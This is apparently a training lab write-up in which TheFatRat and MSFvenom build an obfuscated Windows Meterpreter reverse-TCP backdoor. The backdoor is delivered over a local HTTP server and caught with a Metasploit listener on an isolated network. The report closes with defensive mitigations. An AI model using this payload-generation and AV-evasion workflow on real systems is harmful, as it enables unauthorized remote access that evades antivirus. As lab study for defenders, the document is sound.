# [Lab 07] — Payload Generation & AV Evasion Analysis with TheFatRat

**Platform:** Local Virtualized Infrastructure (Isolated Hypervisor Environment)
**Difficulty:** Medium
**Date:** 2026-11-07
**Category:** Red Teaming / Malware Generation / Static & Heuristic Evasion

---

## 🎯 Objective
The objective of this laboratory was to evaluate the automation capabilities of **TheFatRat** framework for generating cross-platform backdoors, analyze the compiler and obfuscation mechanisms it uses to bypass static antivirus signatures, and verify defensive detection strategies against automated payload wrappers.

## 🧰 Environment and Tools
- **Attacker Node:** Kali Linux Rolling Edition (`[ATTACKER_IP]`)
- **Victim Node:** Windows 10 Pro — Isolated Environment (`[VICTIM_IP]`)
- **Tools Leveraged:** TheFatRat (`screetsec/TheFatRat`), MSFvenom, Metasploit Framework (`multi/handler`), Python3 HTTP Server, Mingw-w64, Backdoor-Factory.

---

## 🔍 Procedure

### 1. Environment Preparation & Tool Deployment
TheFatRat acts as an automated wrapper around **MSFvenom** and various compilers, streamlining the creation of executables, scripts, and infected documents across multiple architectures (Windows, Linux, macOS, and Android).

```bash
# Clone the official repository
git clone https://github.com
cd TheFatRat

# Grant execution permissions and run the dependency setup script
chmod +x setup.sh
./setup.sh
```

* **Dependency Verification:** The setup routine validated and installed required cross-compilers (such as `mingw-w64`), payload encoders, and Android SDK utilities necessary for compiling standalone binaries without manual syntax errors.

---

### 2. Automated Payload Generation & Obfuscation
Once initialized (`./fatrat`), the interactive framework menu was used to craft a custom Windows executable backdoor designed to evade basic signature-based detection.

1. **Vector Selection:** Selected the compiled executable option (`Create Backdoor with C / C# / PowerShell`) to wrap a standard reverse shell payload inside a newly compiled binary structure.
2. **Payload & Network Parameters:**
   * **Payload:** `windows/x64/meterpreter/reverse_tcp`
   * **LHOST:** `[ATTACKER_IP]`
   * **LPORT:** `4444`
3. **Evasion Enhancements:** Applied built-in obfuscation techniques and file size manipulation (*File Pumper*) to alter the binary's entropy and disrupt static hash lookups.

---

### 3. Payload Delivery via Local HTTP Server
Because the victim machine operates inside an isolated Host-Only network without external internet access or shared host folders, a temporary web server was spun up on the attacker machine to transfer the generated `.exe` artifacts over the local segment.

```bash
# Navigate to the output directory containing the compiled .exe payload
cd TheFatRat/output

# Start a temporary HTTP server on port 8000
python3 -m http.server 8000
```

* **Transfer Execution:** From the Windows 10 victim machine, a web browser was opened pointing directly to `http://[ATTACKER_IP]:8000`, allowing the generated `.exe` binary to be downloaded locally onto the target endpoint. Once the transfer completed, the HTTP server was terminated.

---

### 4. Listener Setup & Post-Exploitation Verification
With the payload hosted on the victim node, a corresponding listener was configured in Metasploit to catch the incoming reverse connection.

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
set LPORT 4444
exploit
```

* **Observed Result:** Upon executing the downloaded `.exe` binary on the isolated Windows 10 endpoint, the payload successfully bypassed baseline static checks and established an active reverse connection, granting a **Meterpreter** session.

---

## 📌 Findings
* **Automation of Obfuscation:** Tools like TheFatRat lower the technical barrier for generating mutated payloads by automating C/PowerShell compilation, shellcode injection, and file padding in a single workflow.
* **Limitations of Static Signatures:** Standard antivirus engines relying solely on file hashes or known MSFvenom template signatures struggle to flag newly compiled wrapper binaries unless behavioral analysis is active.

## 🛡️ Mitigation / Remediation
1. **Behavioral & Heuristic Monitoring (EDR):** Deploy Endpoint Detection and Response (EDR) solutions capable of inspecting process memory injection, anomalous child processes, and unauthorized network sockets at runtime rather than relying solely on static disk scans.
2. **Application Control Policies (AppLocker / WDAC):** Restrict the execution of unsigned binaries and scripts originating from non-administrative user directories (e.g., `Downloads`, `Temp`, or `Desktop`).
3. **Network Egress & Ingress Filtering:** Enforce strict internal firewall rules on corporate workstations to block unauthorized HTTP transfers from non-approved internal hosts and restrict outbound reverse TCP connections on non-standard ports.

---

## 🎓 ISC2 Certified in Cybersecurity (CC) Domain Alignment

This practical lab reinforces core governance, technical, and defensive concepts mapped across the **ISC2 CC** certification domains:

| ISC2 CC Domain | Lab Correlation & Practical Application |
| :--- | :--- |
| **Domain 1: Security Principles** | Demonstrates threats to the **CIA Triad** (specifically **Confidentiality** and **Integrity**) when unauthorized remote command execution compromises a host, as well as the **Risk Management** need to assess evasion techniques beyond basic controls. |
| **Domain 3: Access Controls Concepts** | Highlights the importance of **Least Privilege** and **Application Control (AppLocker)**; running an unverified `.exe` under a privileged user context grants immediate, unrestricted system access via Meterpreter. |
| **Domain 4: Network Security** | Illustrates the necessity of **Network Segmentation** (isolating the lab in a Host-Only subnet) and **Firewall Egress/Ingress Rules** to block unauthorized internal HTTP file transfers (`8000/TCP`) and outbound reverse shells (`4444/TCP`). |
| **Domain 5: Security Operations** | Underscores the operational requirement for **Endpoint Detection and Response (EDR)**, continuous **Logging/Monitoring**, and **Security Awareness Training** to detect behavioral anomalies when static antivirus signatures are bypassed. |

---

## 📚 Lessons Learned
* Automated payload generators rely heavily on underlying frameworks like Metasploit; understanding the raw compilation and encoding flags underneath is essential for both offensive auditing and writing accurate detection rules.
* Changing the wrapper language (e.g., compiling shellcode inside a custom C binary) drastically alters the static signature compared to raw MSFvenom executables.

---

## 🔗 References
* Official Repository: [screetsec/TheFatRat](https://github.com/screetsec/TheFatRat/actions)
* Project Milestones & Documentation: [TheFatRat Milestones](https://github.com)
* Certification Framework: [ISC2 Certified in Cybersecurity (CC) Exam Outline](https://isc2.org)
